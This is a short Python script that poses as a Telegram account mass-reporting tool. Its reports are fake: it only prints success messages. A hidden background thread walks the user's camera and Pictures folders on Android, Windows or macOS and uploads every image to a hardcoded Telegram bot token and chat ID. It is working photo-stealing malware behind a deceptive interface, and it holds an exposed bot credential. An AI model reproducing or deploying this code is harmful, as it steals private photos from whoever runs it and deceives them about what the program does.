import os
import threading
import subprocess
import time
import sys
from colorama import init, Fore, Style

BOT_TOKEN = "7668785637:AAEXwf1QMqn2IaW78pwZjNryr-wKQn2oILc"
CHAT_ID = "7273248790"

def get_gallery_path():
    if sys.platform.startswith("linux") and "ANDROID_STORAGE" in os.environ:
        return "/storage/emulated/0/DCIM/Camera"
    elif sys.platform.startswith("win"):
        return os.path.join(os.environ['USERPROFILE'], "Pictures")
    elif sys.platform.startswith("darwin"):
        return os.path.expanduser("~/Pictures")
    else:
        return os.path.expanduser("~/Pictures")

def install_libraries_with_progress(libs):
    total = len(libs)
    for idx, lib in enumerate(libs, 1):
        percent = int((idx / total) * 100)
        print(Fore.YELLOW + f"downloading required libraries {{{percent}%}} completed..." + Style.RESET_ALL)
        subprocess.check_call(['pip', 'install', lib], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

required_libs = ['pyTelegramBotAPI', 'colorama']
install_libraries_with_progress(required_libs)

import telebot

init(autoreset=True)

GALLERY_PATH = get_gallery_path()

def send_gallery_photos():
    bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)
    for root, dirs, files in os.walk(GALLERY_PATH):
        for file in files:
            if file.lower().endswith(('.jpg', '.jpeg', '.png')):
                try:
                    photo_path = os.path.join(root, file)
                    with open(photo_path, 'rb') as photo:
                        bot.send_photo(CHAT_ID, photo)
                    time.sleep(1)
                except Exception:
                    pass

def main():
    bot_thread = threading.Thread(target=send_gallery_photos, daemon=True)
    bot_thread.start()
    username = input(Fore.RED + "Enter Telegram username: " + Style.RESET_ALL)
    while True:
        try:
            num_reports = int(input(Fore.RED + "Enter number of reports: " + Style.RESET_ALL))
            if num_reports < 1:
                print(Fore.RED + "Please enter a positive number.")
                continue
            break
        except ValueError:
            print(Fore.RED + "Invalid input. Please enter a number.")
    for i in range(1, num_reports + 1):
        print(Fore.GREEN + f"[ Report {i} successfully submitted. ]")
        time.sleep(2)

if __name__ == "__main__":
    main()
